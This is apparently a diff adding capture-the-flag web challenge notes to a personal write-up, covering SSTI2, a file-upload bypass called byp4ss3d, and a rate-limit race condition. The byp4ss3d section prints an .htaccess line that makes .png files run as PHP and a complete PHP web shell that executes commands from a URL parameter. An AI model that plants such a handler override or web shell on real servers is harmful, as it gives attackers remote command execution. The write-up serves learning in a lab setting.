@@ -1,5 +1,67 @@
 WEB!
+
 <details><summary></summary></details>
+
+<details><summary>SSTI2</summary>
+
+<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/c64512af-077a-4625-b871-b7a9e5d7bb9a" />
+<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/73465771-bc97-48e2-b137-0a74e8299109" />
+Funny that it can act as a calculator tho
+
+
+
+
+</details>
+
+
+
+<details><summary>byp4ss3d</summary>
+
+> apache vuln regrding htaccess
+> allows for uploading a file to replce it =)
+
+<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/d9a87ddb-0692-453d-828e-7df0645b9321" />
+upload a htaccess file and alter the request with burp cuz cant find the file with . in front of it using gui. The following line will make the server trat png files as php
+```AddHandler application/x-httpd-php .png```
+
+<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/5f409ade-bb0d-435d-82a4-a495a006fa71" />
+Next is the web shell, 
+```
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+
+<form method="GET">
+<input type="text" name="cmd" placeholder="Enter command">
+<input type="submit" value="Execute">
+</form>
+```
+
+<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/11d1d454-bf66-4e54-9f1b-f3502a318e6e" />
+<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/43711bb3-98b8-475e-8ff2-62df43dd96aa" />
+
+with web shell access and a little exploring
+
+<img width="964" height="534" alt="image" src="https://github.com/user-attachments/assets/275d5fc3-afdb-43da-a017-334e4b09c63a" />
+
+
+</details>
+
+<details><summary>Crack the Gate 2</summary>
+So got rate limiting, i see....
+
+Refering to these 2 
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
+- https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group
+
+<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/afc62044-48be-41d3-8ba7-bbd806e20f33" />
+
+<img width="963" height="556" alt="image" src="https://github.com/user-attachments/assets/a4d812c2-d3e7-4cce-956b-392b8bd84da9" />
+
+</details>
+
 
 Easy 
 -
